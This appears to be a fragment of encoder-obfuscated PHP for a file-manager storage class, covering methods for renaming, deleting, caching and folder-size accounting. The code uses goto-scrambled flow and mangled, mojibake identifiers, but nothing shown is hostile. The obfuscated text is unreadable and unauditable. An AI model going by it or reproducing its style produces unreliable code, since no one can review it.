$E°‰¦–õÁ÷ = $DŠïµ„–×[$F½âé¬¸Ê¢[385]]; if ($DŠïµ„–×[$F½âé¬¸Ê¢[386]] == $F½âé¬¸Ê¢[83]) { $bé§¸­äŠø = array($F½âé¬¸Ê¢[542] => array($F½âé¬¸Ê¢[500], $DŠïµ„–×[$F½âé¬¸Ê¢[476]] . $E°‰¦–õÁ÷ . $F½âé¬¸Ê¢[501])); $cÊ¿â­Õ = array($F½âé¬¸Ê¢[542] => $bé§¸­äŠø[$F½âé¬¸Ê¢[476]]); $FììîÒ·Ùƒ = $this->field($F½âé¬¸Ê¢[1934])->where($cÊ¿â­Õ)->select(); $BÒò­­òŸ = !1; $B¬ÕÍŞÏ¬” = array($E°‰¦–õÁ÷); if ($FììîÒ·Ùƒ) { $BÒò­­òŸ = array_to_keyvalue($FììîÒ·Ùƒ, $F½âé¬¸Ê¢[33], $F½âé¬¸Ê¢[435]); $BÒò­­òŸ = array_remove_value($BÒò­­òŸ, $F½âé¬¸Ê¢[485]); $B¬ÕÍŞÏ¬” = array_to_keyvalue($FììîÒ·Ùƒ, $F½âé¬¸Ê¢[33], $F½âé¬¸Ê¢[385]); $B¬ÕÍŞÏ¬”[] = $E°‰¦–õÁ÷; } } else { $BÒò­­òŸ = array($DŠïµ„–×[$F½âé¬¸Ê¢[435]]); $B¬ÕÍŞÏ¬” = array($E°‰¦–õÁ÷); } return array($F½âé¬¸Ê¢[1931] => $B¬ÕÍŞÏ¬”, $F½âé¬¸Ê¢[1307] => $BÒò­­òŸ); } public function removeArray($cóª¶ˆ¶ø) { if (!$cóª¶ˆ¶ø) { return !0; } } public function removeRelevance($C„İÀ‚ô£É, $a¢½Øè±«º) { goto E’ìŠÍõ’„; EèƒÓ—ƒ£Ã: $DÕœøÑ„Í = array($B†ˆå‰è¨[399] => array($B†ˆå‰è¨[400], $C„İÀ‚ô£É)); Model($B†ˆå‰è¨[1932])->where($DÕœøÑ„Í)->delete(); Model($B†ˆå‰è¨[429])->where($DÕœøÑ„Í)->delete(); goto Cß×íî¸î; E’ìŠÍõ’„: $B†ˆå‰è¨ =& $_SERVER[ÈİÅ¿ÈÈ¥×]; $C„İÀ‚ô£É = $C„İÀ‚ô£É ? $C„İÀ‚ô£É : array(); $a¢½Øè±«º = $a¢½Øè±«º ? $a¢½Øè±«º : array(); goto aÀ‹í÷Å¤; Cß×íî¸î: Model($B†ˆå‰è¨[1784])->where($DÕœøÑ„Í)->delete(); Model($B†ˆå‰è¨[522])->where($DÕœøÑ„Í)->delete(); Model($B†ˆå‰è¨[1627])->removeBySource($C„İÀ‚ô£É); goto Bí™»ğ·Ö¤; Bí™»ğ·Ö¤: Model($B†ˆå‰è¨[1913])->removeBySource($C„İÀ‚ô£É); $this->where($DÕœøÑ„Í)->delete(); Model($B†ˆå‰è¨[438])->remove($a¢½Øè±«º); goto c¾¦Çª®; c¾¦Çª®: for ($BÇ¦÷ØÂÓ = 0; $BÇ¦÷ØÂÓ < count($C„İÀ‚ô£É); $BÇ¦÷ØÂÓ++) { $this->sourceCacheClear($C„İÀ‚ô£É[$BÇ¦÷ØÂÓ]); } goto B´à™¶ˆÜ; aÀ‹í÷Å¤: $C„İÀ‚ô£É = array_unique(array_filter($C„İÀ‚ô£É)); $a¢½Øè±«º = array_unique(array_filter($a¢½Øè±«º)); if (!$C„İÀ‚ô£É) { return !1; } goto EèƒÓ—ƒ£Ã; B´à™¶ˆÜ: } public function rename($BËëåÛ‡£Š, $C ÓÔê­›á) { goto CÇ“¼Şí—; CÏ¤·œ …ì: $this->setNamePinyin($BËëåÛ‡£Š, $A’É÷äöÓÄ[$A†Èê¡äì–[28]], !1); $this->updateModifyTime($C †…Š«ä®[$A†Èê¡äì–[478]]); $dŒìè„Êö = $this->where(array($A†Èê¡äì–[399] => $BËëåÛ‡£Š))->data($A’É÷äöÓÄ)->save(); goto D‚Ñõô—¦®; CÇ“¼Şí—: $A†Èê¡äì– =& $_SERVER[ÈİÅ¿ÈÈ¥×]; $C †…Š«ä® = $this->sourceInfo($BËëåÛ‡£Š); if (!$C †…Š«ä®) { return !1; } goto cçô²˜´Äñ; cçô²˜´Äñ: $b÷ÀÉŒİ‰ = $this->fileNameExist($C †…Š«ä®[$A†Èê¡äì–[478]], $C ÓÔê­›á); if ($b÷ÀÉŒİ‰ && $b÷ÀÉŒİ‰ != $BËëåÛ‡£Š) { return !1; } $A’É÷äöÓÄ = array($A†Èê¡äì–[402] => $C ÓÔê­›á, $A†Èê¡äì–[541] => USER_ID); goto bĞÔ£œÒœ¼; bĞÔ£œÒœ¼: if (!$C †…Š«ä®[$A†Èê¡äì–[386]] == $A†Èê¡äì–[83]) { $A’É÷äöÓÄ[$A†Èê¡äì–[388]] = get_path_ext($C ÓÔê­›á); } Model($A†Èê¡äì–[522])->eventRename($BËëåÛ‡£Š, $C †…Š«ä®[$A†Èê¡äì–[28]], $C ÓÔê­›á); $this->sourceCacheClear($BËëåÛ‡£Š); goto CÏ¤·œ …ì; D‚Ñõô—¦®: $cµÆ£Õ“×“ = $A†Èê¡äì–[1921] . $C †…Š«ä®[$A†Èê¡äì–[478]]; if (isset(self::$cacheChildList[$cµÆ£Õ“×“])) { unset(self::$cacheChildList[$cµÆ£Õ“×“]); } return $dŒìè„Êö; goto EÔÒùÓ‰Ó¢; EÔÒùÓ‰Ó¢: } public function setNamePinyin($e±‹ÄšŠæÈ, $fãŒ™é”ƒø, $Cê¸¯˜ùï = true) { $Cˆ†„ÔÅ±ê =& $_SERVER[ÈİÅ¿ÈÈ¥×]; $DÅÔœñé÷Ó = Input::check($fãŒ™é”ƒø, $Cˆ†„ÔÅ±ê[545]); if ($Cê¸¯˜ùï && !$DÅÔœñé÷Ó) { return; } if (!$DÅÔœñé÷Ó) { $this->metaSet($e±‹ÄšŠæÈ, $Cˆ†„ÔÅ±ê[432], null); $this->metaSet($e±‹ÄšŠæÈ, $Cˆ†„ÔÅ±ê[431], null); return; } $A™¬²¾ç† = array($Cˆ†„ÔÅ±ê[432] => str_replace($Cˆ†„ÔÅ±ê[50], $Cˆ†„ÔÅ±ê[33], Pinyin::encode($fãŒ™é”ƒø)), $Cˆ†„ÔÅ±ê[431] => Pinyin::encode($fãŒ™é”ƒø, $Cˆ†„ÔÅ±ê[546])); $this->metaSet($e±‹ÄšŠæÈ, $A™¬²¾ç†); } public function getContent($AŞ‚Ã¾×¢¦) { goto dÂ‰ğƒ’‘Ü; Câ²ŸºÃÁ: if (!$dßƒåÇ½”§[$cë—¼Ç‹­â[75]]) { return $cë—¼Ç‹­â[33]; } return IO::getContent($dßƒåÇ½”§[$cë—¼Ç‹­â[75]]); goto bïÙÆÚš±ƒ; DÃÜ‰ª–ĞÏ: if ($dßƒåÇ½”§[$cë—¼Ç‹­â[77]] == 0) { return $cë—¼Ç‹­â[33]; } $BÙîÙ¾ÌîË = $cë—¼Ç‹­â[1935] . $dßƒåÇ½”§[$cë—¼Ç‹­â[167]]; if ($dßƒåÇ½”§[$cë—¼Ç‹­â[77]] <= 1024 * 10) { $FßÆç¡µ = Cache::get($BÙîÙ¾ÌîË); if (!$FßÆç¡µ) { $FßÆç¡µ = IO::getContent($dßƒåÇ½”§[$cë—¼Ç‹­â[75]]); Cache::set($BÙîÙ¾ÌîË, $FßÆç¡µ); } return $FßÆç¡µ; } goto Câ²ŸºÃÁ; dÂ‰ğƒ’‘Ü: $cë—¼Ç‹­â =& $_SERVER[ÈİÅ¿ÈÈ¥×]; $dßƒåÇ½”§ = $this->fileInfoGet($AŞ‚Ã¾×¢¦); if (!$dßƒåÇ½”§) { return !1; } goto DÃÜ‰ª–ĞÏ; bïÙÆÚš±ƒ: } public function setDesc($b…óõ‰ŒÁ, $d…«†Ÿ¥ó) { $EšÂºÜÆÕ =& $_SERVER[ÈİÅ¿ÈÈ¥×]; Model($EšÂºÜÆÕ[522])->eventAddDesc($b…óõ‰ŒÁ, $d…«†Ÿ¥ó); return $this->metaSet($b…óõ‰ŒÁ, $EšÂºÜÆÕ[421], $d…«†Ÿ¥ó); } public function setContent($b·èÅ¹²ø‹, $cå±Å¬Û = '') { goto F‚°‡‹·ÛÁ; dàÔ†Ì¸÷†: if (!$c¸Ü—ÉåôĞ) { return Model($bŠƒÍå•×í[438])->remove($bÁâß³Îƒ°[$bŠƒÍå•×í[435]]); } $this->folderSizeReset($a©ñ‡©ğçº[$bŠƒÍå•×í[478]]); return !0; goto få£è´œ»; a¹Á‡çóœë: if (!$A‰öÑ¿“òÕ || !$a©ñ‡©ğçº) { return !1; } $bÁâß³Îƒ° = Model($bŠƒÍå•×í[438])->addFileByContent($cå±Å¬Û, $a©ñ‡©ğçº[$bŠƒÍå•×í[28]]); $c¸Ü—ÉåôĞ = $this->fileHistory($a©ñ‡©ğçº, $bÁâß³Îƒ°[$bŠƒÍå•×í[435]], $bÁâß³Îƒ°[$bŠƒÍå•×í[77]]); goto dàÔ†Ì¸÷†; F‚°‡‹·ÛÁ: $bŠƒÍå•×í =& $_SERVER[ÈİÅ¿ÈÈ¥×]; $a©ñ‡©ğçº = $this->sourceInfo($b·èÅ¹²ø‹); $A‰öÑ¿“òÕ = $this->fileInfoGet($b·èÅ¹²ø‹); goto a¹Á‡çóœë; få£è´œ»: } public function fileSubstr($Eêù„ˆÒá”, $EÈªÒŞ¥î—, $e¯§Ñ…‡†‰) { $aÁø¿Ñ°ÙÑ = $this->fileInfoGet($Eêù„ˆÒá”); if (!$aÁø¿Ñ°ÙÑ) { return !1; } return IO::fileSubstr($aÁø¿Ñ°ÙÑ[$_SERVER[ÈİÅ¿ÈÈ¥×][75]], $EÈªÒŞ¥î—, $e¯§Ñ…‡†‰); } public function fileInfoGet($e²—ƒ‘°‰) { goto EİØÜ¹…; DéÈŸ„Æ×‘: $BóƒÑ§ÆŞ = Model($aôÈ««èó“[438])->fileInfo($D·ô°óÜ¨ƒ[$aôÈ««èó“[435]]); if ($BóƒÑ§ÆŞ) { $BóƒÑ§ÆŞ[$aôÈ««èó“[28]] = $D·ô°óÜ¨ƒ[$aôÈ««èó“[28]]; } self::$cacheFileInfo[$eÚåõ¤ÙáÌ] = $BóƒÑ§ÆŞ; goto C©ƒÕñ¶¥; EİØÜ¹…: $aôÈ««èó“ =& $_SERVER[ÈİÅ¿ÈÈ¥×]; $D·ô°óÜ¨ƒ = $this->sourceInfo($e²—ƒ‘°‰); if (!$D·ô°óÜ¨ƒ || $D·ô°óÜ¨ƒ[$aôÈ««èó“[386]]) { return !1; } goto BªÚñÅŒƒ«; C©ƒÕñ¶¥: return $BóƒÑ§ÆŞ; goto CßÃœé˜­†; BªÚñÅŒƒ«: $eÚåõ¤ÙáÌ = $aôÈ««èó“[441] . $D·ô°óÜ¨ƒ[$aôÈ««èó“[435]]; $D«†á¨™íš = _get(self::$cacheFileInfo, $eÚåõ¤ÙáÌ); if ($D«†á¨™íš) { return $D«†á¨™íš; } goto DéÈŸ„Æ×‘; CßÃœé˜­†: } private function folderChildrenNumber($dˆ“«“–Îç) { $AŠÒœ¡ÄÖ¥ =& $_SERVER[ÈİÅ¿ÈÈ¥×]; $B§Œñµ‹²Å = $this->sourceInfo($dˆ“«“–Îç); $Eç¿²½¢ƒƒ = array($AŠÒœ¡ÄÖ¥[542] => array($AŠÒœ¡ÄÖ¥[500], $B§Œñµ‹²Å[$AŠÒœ¡ÄÖ¥[476]] . $dˆ“«“–Îç . $AŠÒœ¡ÄÖ¥[501]), $AŠÒœ¡ÄÖ¥[412] => intval($B§Œñµ‹²Å[$AŠÒœ¡ÄÖ¥[413]]), $AŠÒœ¡ÄÖ¥[535] => 1); $d–ééïôã = $this->where($Eç¿²½¢ƒƒ)->count(); $DÓÊŸ·‡†ù = $this->where($Eç¿²½¢ƒƒ)->where(array($AŠÒœ¡ÄÖ¥[535] => 0))->count(); return array($AŠÒœ¡ÄÖ¥[81] => $DÓÊŸ·‡†ù, $AŠÒœ¡ÄÖ¥[82] => $d–ééïôã); } public function pathInfo($dÛ˜’¢»ª¼, $aŒÄ²çšïÑ = false) { goto B™‚¼¿‰–Ï; B±ĞŞƒà³: $D“õ£¿å¦“ = $A˜ëÆˆ™Šè[427] . intval($aŒÄ²çšïÑ) . $A˜ëÆˆ™Šè[428] . $dÛ˜’¢»ª¼; $d­™—É«Ç• = _get(self::$cachePathInfo, $D“õ£¿å¦“); if ($d­™—É«Ç•) { return $d­™—É«Ç•; } goto BÇ„åôãÙâ; BÇ„åôãÙâ: $aå‘Âõ„Ñ = $this->sourceInfo($dÛ˜’¢»ª¼); if (!$aå‘Âõ„Ñ) { return !1; } $aå‘Âõ„Ñ = $this->_listDataApplyItem($aå‘Âõ„Ñ, $aŒÄ²çšïÑ); goto cÍœ¾ÇøÔÌ; cÍœ¾ÇøÔÌ: self::$cachePathInfo[$D“õ£¿å¦“] = $aå‘Âõ„Ñ; return $aå‘Âõ„Ñ; goto BìÃõë®Ù½; B™‚¼¿‰–Ï: $A˜ëÆˆ™Šè =& $_SERVER[ÈİÅ¿ÈÈ¥×]; $aŒÄ²çšïÑ = !1; $dÛ˜’¢»ª¼ = intval($dÛ˜’¢»ª¼); goto B±ĞŞƒà³; BìÃõë®Ù½: } public static $cachePathInfoMore = array(); public function pathInfoMore($f¹µ¢¹ª˜) { goto Cğ‹Ï³÷ù; Cğ‹Ï³÷ù: $Aô‰ã‹ø® =& $_SERVER[ÈİÅ¿ÈÈ¥×]; $a³ÓİÑØÎ = _get(self::$cachePathInfoMore, $f¹µ¢¹ª˜); if ($a³ÓİÑØÎ) { return $a³ÓİÑØÎ; } goto BÔŠğã¸•¨; BÔŠğã¸•¨: $CÜ—«£Ô„Ş = $this->pathInfo($f¹µ¢¹ª˜); if (!$CÜ—«£Ô„Ş) { return !1; } if ($CÜ—«£Ô„Ş[$Aô‰ã‹ø®[386]] == $Aô‰ã‹ø®[83]) { $CÜ—«£Ô„Ş[$Aô‰ã‹ø®[80]] = $this->folderChildrenNumber($f¹µ¢¹ª˜); } goto BÖ²™¿Ğì‰; BÖ²™¿Ğì‰: self::$cachePathInfoMore[$f¹µ¢¹ª˜] = $CÜ—«£Ô„Ş; return $CÜ—«£Ô„Ş; goto C‰ÀÙÂé­„; C‰ÀÙÂé­„: } public function sourceInfo($bØÊ°÷ª‚) { goto dâÙğ‰‹‡Í; c±½¯’ÍÚÍ: $b¶ÑƒŒÎ£ = $this->where(array($b©ŒŒ÷óö”[385] => $bØÊ°÷ª‚))->find(); self::$cacheSourceInfo[$b®ÇåŞ¸ÌĞ] = $b¶ÑƒŒÎ£; return self::$cacheSourceInfo[$b®ÇåŞ¸ÌĞ]; goto Dîâ¦µĞêë; cÕ­ò¨±Ø: $b®ÇåŞ¸ÌĞ = $b©ŒŒ÷óö”[426] . $bØÊ°÷ª‚; $eè¥µå³ØÏ = _get(self::$cacheSourceInfo, $b®ÇåŞ¸ÌĞ); if ($eè¥µå³ØÏ) { return $eè¥µå³ØÏ; } goto c±½¯’ÍÚÍ; dâÙğ‰‹‡Í: $b©ŒŒ÷óö” =& $_SERVER[ÈİÅ¿ÈÈ¥×]; if (!$bØÊ°÷ª‚) { return array(); } $bØÊ°÷ª‚ = intval($bØÊ°÷ª‚); goto cÕ­ò¨±Ø; Dîâ¦µĞêë: } public function sourceCacheClear($cËƒ„ÃÖ = false) { self::cacheClear($cËƒ„ÃÖ); } public static function cacheClear($d‰“ÏÒƒÓô = false) { $a£¼­‹¥Ü• =& $_SERVER[ÈİÅ¿ÈÈ¥×]; if ($d‰“ÏÒƒÓô == !1) { goto a¥™“¦ß§; a¥™“¦ß§: self::$cacheSourceInfo = null; self::$cacheSourceInfo = array(); self::$cachePathInfo = null; goto b§Ë¯¯¼ïÎ; b§Ë¯¯¼ïÎ: self::$cachePathInfo = array(); self::$cachePathInfoMore = null; self::$cachePathInfoMore = array(); goto aÕ¬«Ñ÷¸í; aÕ¬«Ñ÷¸í: return; goto fğÁõäåŒ¦; fğÁõäåŒ¦: } unset(self::$cacheSourceInfo[$a£¼­‹¥Ü•[426] . $d‰“ÏÒƒÓô]); unset(self::$cachePathInfoMore[$d‰“ÏÒƒÓô]); unset(self::$cachePathInfo[$a£¼­‹¥Ü•[1936] . $d‰“ÏÒƒÓô]); unset(self::$cachePathInfo[$a£¼­‹¥Ü•[1937] . $d‰“ÏÒƒÓô]); } public function metaSet($d´ÈïĞ·‡, $béÀ‡”ßä = null, $cªœÑÑºº¡ = null) { $d›¾¶¼ÖŠ = parent::metaSet($d´ÈïĞ·‡, $béÀ‡”ßä, $cªœÑÑºº¡); if ($d›¾¶¼ÖŠ) { $this->sourceCacheClear($d´ÈïĞ·‡); } return $d›¾¶¼ÖŠ; } public function pathInfoByPath($Cîğ…ƒ¿, $F¡ù¡”¸ì) { $fâÖâ¯Ûİ‚ =& $_SERVER[ÈİÅ¿ÈÈ¥×]; $eù”µÍí’£ = !$F¡ù¡”¸ì ? array() : explode($fâÖâ¯Ûİ‚[8], trim($F¡ù¡”¸ì, $fâÖâ¯Ûİ‚[8])); $bêÊôŸ‡²Ì = $Cîğ…ƒ¿; foreach ($eù”µÍí’£ as $a¬’ÎËÅ‘) { $DŒÕßğ»¥Œ = array($fâÖâ¯Ûİ‚[478] => $bêÊôŸ‡²Ì, $fâÖâ¯Ûİ‚[28] => $a¬’ÎËÅ‘); $d„é¦ŸÉæô = $this->where($DŒÕßğ»¥Œ)->select(); if (!$d„é¦ŸÉæô) { return !1; } $d„é¦ŸÉæô = array_sort_by($d„é¦ŸÉæô, $fâÖâ¯Ûİ‚[413]); $bêÊôŸ‡²Ì = $d„é¦ŸÉæô[0][$fâÖâ¯Ûİ‚[385]]; } return $this->pathInfo($bêÊôŸ‡²Ì, !0); } protected function updateModifyTime($dÅäÎ¥šÏá) { goto dö‚¶ÊÊğİ; dö‚¶ÊÊğİ: $b®µîóÕŸÕ =& $_SERVER[ÈİÅ¿ÈÈ¥×]; if (!$dÅäÎ¥šÏá) { return; } if (!is_array($dÅäÎ¥šÏá)) { $dÅäÎ¥šÏá = array($dÅäÎ¥šÏá); } goto f‘ÁŒø¾Ó¾; f‘ÁŒø¾Ó¾: foreach ($dÅäÎ¥šÏá as $BØŞ»„„¼« => $eªòë¶µÑå) { $dÅäÎ¥šÏá[$BØŞ»„„¼«] = intval($eªòë¶µÑå); $this->sourceCacheClear($eªòë¶µÑå); } $A¨±¯­£òì = array($b®µîóÕŸÕ[385] => array($b®µîóÕŸÕ[7], $dÅäÎ¥šÏá)); $d÷‘¾¡¬š± = array($b®µîóÕŸÕ[541] => USER_ID, $b®µîóÕŸÕ[406] => time()); goto a¦±ÚÑÓ„…; a¦±ÚÑÓ„…: $this->where($A¨±¯­£òì)->save($d÷‘¾¡¬š±); goto F–¶Ò¾¶ã; F–¶Ò¾¶ã: } public function folderSizeReset($bÌ£ŠŠåÇ…, $bôÉ®¯¥¡¤ = false) { goto c”‚õí‰ª‘; Cšè•Û´Üª: if ($bôÉ®¯¥¡¤ == 0) { return CacheLock::unlock($A˜‰‹óæ­·); } $dö¿Ìğ¥›Ú = $this->parentLevelArray($C¹ƒŞ¬Ş’Í[$DÂóå…æ¨¼[476]]); if (!$dö¿Ìğ¥›Ú) { $dö¿Ìğ¥›Ú = array(); } goto b•ˆ–ŞÙ‰; c”‚õí‰ª‘: $DÂóå…æ¨¼ =& $_SERVER[ÈİÅ¿ÈÈ¥×]; if ($this->statusIgnoreResetSpace) { return; } $C¹ƒŞ¬Ş’Í = $this->sourceInfo($bÌ£ŠŠåÇ…); goto E¿ÂŸœ¢¢È; b•ˆ–ŞÙ‰: $dö¿Ìğ¥›Ú[] = $C¹ƒŞ¬Ş’Í[$DÂóå…æ¨¼[385]]; $E¼¦‰Æè¸å = array($DÂóå…æ¨¼[385] => array($DÂóå…æ¨¼[400], $dö¿Ìğ¥›Ú)); if ($bôÉ®¯¥¡¤ < 0) { $E¼¦‰Æè¸å[$DÂóå…æ¨¼[77]] = array($DÂóå…æ¨¼[937], abs($bôÉ®¯¥¡¤)); } goto b¸÷”­ÖŞÓ; E¿ÂŸœ¢¢È: $A˜‰‹óæ­· = $DÂóå…æ¨¼[1938] . $bÌ£ŠŠåÇ…; CacheLock::lock($A˜‰‹óæ­·, 20); if ($bôÉ®¯¥¡¤ === !1) { $this->sourceCacheClear($bÌ£ŠŠåÇ…); $C¹ƒŞ¬Ş’Í = $this->sourceInfo($bÌ£ŠŠåÇ…); $E¼¦‰Æè¸å = array($DÂóå…æ¨¼[384] => $bÌ£ŠŠåÇ…, $DÂóå…æ¨¼[412] => 0); $AÏÙ—£‹¤ = $this->where($E¼¦‰Æè¸å)->sum($DÂóå…æ¨¼[77]); $bôÉ®¯¥¡¤ = intval($AÏÙ—£‹¤) - intval($C¹ƒŞ¬Ş’Í[$DÂóå…æ¨¼[77]]); } goto Cšè•Û´Üª; b¸÷”­ÖŞÓ: $this->where($E¼¦‰Æè¸å)->setAdd($DÂóå…æ¨¼[77], $bôÉ®¯¥¡¤); CacheLock::unlock($A˜‰‹óæ­·); $this->targetSpaceUpdate($C¹ƒŞ¬Ş’Í[$DÂóå…æ¨¼[387]], $C¹ƒŞ¬Ş’Í[$DÂóå…æ¨¼[473]]); goto AÃàº·Ü†; AÃàº·Ü†: } public function folderSizeResetChildren($a¼ë¼›—©›) { goto DßÇÈ¦¥¹Ê; aÜ±”åã¼³: $BÅ·º“¸…ñ[$A†èô­­ñœ[386]] = 0; $DŠòéŸ´Ø = $this->field($eÚğ†õ‰šà)->where($BÅ·º“¸…ñ)->select(); if (!$DŠòéŸ´Ø) { return; } goto CÈöŒ½ ï“; eöšÒ°ß‹¿: $BÅ·º“¸…ñ = array($A†èô­­ñœ[535] => 1, $A†èô­­ñœ[542] => array($A†èô­­ñœ[500], $FÖÆ•‘Ôàá[$A†èô­­ñœ[476]] . $a¼ë¼›—©› . $A†èô­­ñœ[501])); $eÚğ†õ‰šà = $A†èô­­ñœ[1939]; $b¬ø‘Î»‹Ÿ = $this->field($eÚğ†õ‰šà)->where($BÅ·º“¸…ñ)->select(); goto aÜ±”åã¼³; CÈöŒ½ ï“: $b¬ø‘Î»‹Ÿ[] = $FÖÆ•‘Ôàá; $b¬ø‘Î»‹Ÿ = array_to_keyvalue($b¬ø‘Î»‹Ÿ, $A†èô­­ñœ[385]); foreach ($b¬ø‘Î»‹Ÿ as $d”†©ì™ª => $F«–´Ÿ ¼Ù) { $b¬ø‘Î»‹Ÿ[$d”†©ì™ª][$A†èô­­ñœ[1940]] = $b¬ø‘Î»‹Ÿ[$d”†©ì™ª][$A†èô­­ñœ[77]]; $b¬ø‘Î»‹Ÿ[$d”†©ì™ª][$A†èô­­ñœ[77]] = 0; } goto aÅİ¤Ò’¬; DßÇÈ¦¥¹Ê: $A†èô­­ñœ =& $_SERVER[ÈİÅ¿ÈÈ¥×]; $this->sourceCacheClear($a¼ë¼›—©›); $FÖÆ•‘Ôàá = $this->sourceInfo($a¼ë¼›—©›); goto eöšÒ°ß‹¿; f‚»™ğ‡ä¤: foreach ($b¬ø‘Î»‹Ÿ as $F«–´Ÿ ¼Ù) { if ($F«–´Ÿ ¼Ù[$A†èô­­ñœ[77]] == $F«–´Ÿ ¼Ù[$A†èô­­ñœ[1940]]) { continue; } $FÍÉÀ©±Óì[] = array($A†èô­­ñœ[385], $F«–´Ÿ ¼Ù[$A†èô­­ñœ[385]], $A†èô­­ñœ[77], $F«–´Ÿ ¼Ù[$A†èô­­ñœ[77]]); } $this->saveAll($FÍÉÀ©±Óì); goto dÖ•ÛÓÑ†…; aÅİ¤Ò’¬: foreach ($DŠòéŸ´Ø as $F«–´Ÿ ¼Ù) { $d¾êˆŸ•¢“ = $F«–´Ÿ ¼Ù[$A†èô­­ñœ[478]] . $A†èô­­ñœ[33]; if (!isset($b¬ø‘Î»‹Ÿ[$d¾êˆŸ•¢“])) { continue; } if ($F«–´Ÿ ¼Ù[$A†èô­­ñœ[413]] == $b¬ø‘Î»‹Ÿ[$d¾êˆŸ•¢“][$A†èô­­ñœ[413]]) { $b¬ø‘Î»‹Ÿ[$d¾êˆŸ•¢“][$A†èô­­ñœ[77]] += $F«–´Ÿ ¼Ù[$A†èô­­ñœ[77]]; } } foreach ($b¬ø‘Î»‹Ÿ as $F«–´Ÿ ¼Ù) { $f÷Ã¢–ÎÏ = $this->parentLevelArray($F«–´Ÿ ¼Ù[$A†èô­­ñœ[476]]); foreach ($f÷Ã¢–ÎÏ as $d¾êˆŸ•¢“) { $d¾êˆŸ•¢“ = $d¾êˆŸ•¢“ . $A†èô­­ñœ[33]; if (!isset($b¬ø‘Î»‹Ÿ[$d¾êˆŸ•¢“])) { continue; } if ($F«–´Ÿ ¼Ù[$A†èô­­ñœ[413]] == $b¬ø‘Î»‹Ÿ[$d¾êˆŸ•¢“][$A†èô­­ñœ[413]]) { $b¬ø‘Î»‹Ÿ[$d¾êˆŸ•¢“][$A†èô­­ñœ[77]] += $F«–´Ÿ ¼Ù[$A†èô­­ñœ[77]]; } } } $FÍÉÀ©±Óì = array(); goto f‚»™ğ‡ä¤; dÖ•ÛÓÑ†…: } public function userSpaceReset($d†¼Ø½» = false) { $c»ï¹¸ô’ =& $_SERVER[ÈİÅ¿ÈÈ¥×]; $F´İ òß« = $this->where(array($c»ï¹¸ô’[387] => self::TYPE_USER, $c»ï¹¸ô’[473] => $d†¼Ø½», $c»ï¹¸ô’[386] => 0))->sum($c»ï¹¸ô’[77]); Model($c»ï¹¸ô’[491])->userEdit($d†¼Ø½», array($c»ï¹¸ô’[1636] => $F´İ òß«)); } public function targetSpaceUpdate($DÏ‘ˆˆ—×È, $Dƒ£«­ùÛĞ) { $Bƒù¡£ÈÆ =& $_SERVER[ÈİÅ¿ÈÈ¥×]; if (!$Dƒ£«­ùÛĞ) { return; } if (!in_array($DÏ‘ˆˆ—×È, array(self::TYPE_USER, self::TYPE_GROUP))) { return; } $aÉ¬¿Şµªˆ = $this->targetSpaceSize($DÏ‘ˆˆ—×È, $Dƒ£«­ùÛĞ); if ($DÏ‘ˆˆ—×È == self::TYPE_USER) { Model($Bƒù¡£ÈÆ[491])->userEdit($Dƒ£«­ùÛĞ, array($Bƒù¡£ÈÆ[1636] => $aÉ¬¿Şµªˆ)); } else { if ($DÏ‘ˆˆ—×È == self::TYPE_GROUP) { Model($Bƒù¡£ÈÆ[475])->groupEdit($Dƒ£«­ùÛĞ, array($Bƒù¡£ÈÆ[1636] => $aÉ¬¿Şµªˆ)); } } } public function targetSpaceSize($FØõŞĞé½, $aíêóĞĞİî) { goto D¦ÔÚèä‰¢; eæ‘™šŒˆ•: $b‰¬…öƒí = floatval($AğåÁÖğÑ[$dîšÛ®¥á[77]]); $Dñ‰ÂÚï‚Ë = array($dîšÛ®¥á[542] => array($dîšÛ®¥á[500], $dîšÛ®¥á[487] . $AğåÁÖğÑ[$dîšÛ®¥á[385]] . $dîšÛ®¥á[501])); $f‹„Ğø¤Ã = Model($dîšÛ®¥á[411])->field($dîšÛ®¥á[399])->where($Dñ‰ÂÚï‚Ë)->select(); goto D™¥ÛÚ©³Ì; D™¥ÛÚ©³Ì: $f‹„Ğø¤Ã = array_to_keyvalue($f‹„Ğø¤Ã, $dîšÛ®¥á[33], $dîšÛ®¥á[385]); $f‹„Ğø¤Ã = array_unique(array_filter($f‹„Ğø¤Ã)); if ($f‹„Ğø¤Ã) { $Dñ‰ÂÚï‚Ë = array($dîšÛ®¥á[399] => array($dîšÛ®¥á[400], $f‹„Ğø¤Ã)); $b‰¬…öƒí += floatval($this->where($Dñ‰ÂÚï‚Ë)->sum($dîšÛ®¥á[77])); } goto FÑåß¬œ¶; D¦ÔÚèä‰¢: $dîšÛ®¥á =& $_SERVER[ÈİÅ¿ÈÈ¥×]; $AğåÁÖğÑ = $this->sourceRoot($FØõŞĞé½, $aíêóĞĞİî, !0); if (!$AğåÁÖğÑ) { return 0; } goto eæ‘™šŒˆ•; FÑåß¬œ¶: return $b‰¬…öƒí; goto B­Á¹Ÿãóß; B­Á¹Ÿãóß: } public function allFileTypeProfile() { return $this->fileTypeProfile(!1, !1); } public function userFileTypeProfile($B–Õ¼È¤õñ) { return $this->fileTypeProfile($B–Õ¼È¤õñ, SourceModel::TYPE_USER); } public function groupFileTypeProfile($cµéË«ï­) { return $this->fileTypeProfile($cµéË«ï­, SourceModel::TYPE_GROUP); } private function fileTypeProfile($aİØÌ‘›ˆÒ, $C¥ƒôæÀ±) { goto d§Ù¹Æî‹Ğ; c¦ì¼×®À”: foreach ($B ç§â±ÔÚ as $bƒæ»ÊÇñ => $C› Ç«˜†Ğ) { $e«…ÃÒàÀå[$d„©ŞˆÛÆ¨[388]] = $this->fileTypeWhere($bƒæ»ÊÇñ); $bÁÆä·çÈ[$bƒæ»ÊÇñ] = array($d„©ŞˆÛÆ¨[1943] => $C› Ç«˜†Ğ[$d„©ŞˆÛÆ¨[28]], $d„©ŞˆÛÆ¨[1944] => $this->where($e«…ÃÒàÀå)->count(), $d„©ŞˆÛÆ¨[537] => $this->where($e«…ÃÒàÀå)->sum($d„©ŞˆÛÆ¨[77])); } Cache::set($E¥Ù”ê¬, $bÁÆä·çÈ, 1200); return $bÁÆä·çÈ; goto b¹½Èˆ•; F­È´ÍÕã²: if ($cé¶Ñ¶í¯) { return $cé¶Ñ¶í¯; } $e«…ÃÒàÀå = array($d„©ŞˆÛÆ¨[535] => 0); if ($aİØÌ‘›ˆÒ != !1) { $e«…ÃÒàÀå[$d„©ŞˆÛÆ¨[473]] = $aİØÌ‘›ˆÒ; $e«…ÃÒàÀå[$d„©ŞˆÛÆ¨[387]] = $C¥ƒôæÀ±; } goto aÕªĞõÍ¿; d§Ù¹Æî‹Ğ: 